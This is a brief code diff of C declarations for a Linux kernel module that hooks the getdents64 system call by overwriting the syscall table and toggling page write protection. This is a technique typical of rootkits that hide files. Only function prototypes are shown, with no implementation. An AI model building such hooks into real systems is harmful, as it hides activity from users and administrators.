@@ -30,7 +30,7 @@ asmlinkage long unsigned (*org_getdents64) (const struct pt_regs* pt_regs);
 asmlinkage long sys_getdents64_hook(const struct pt_regs* pt_regs);
 int set_page_write(unsigned long addr);
 void set_page_no_write(unsigned long addr);
-int replace_getdents_syscall(void);
+int replace_getdents_syscall(unsigned long * sys_call_table_addr);
 void remove_hook(void);
 void unload(void);
 asmlinkage long unsigned (*org_getdents64) (const struct pt_regs* pt_regs);
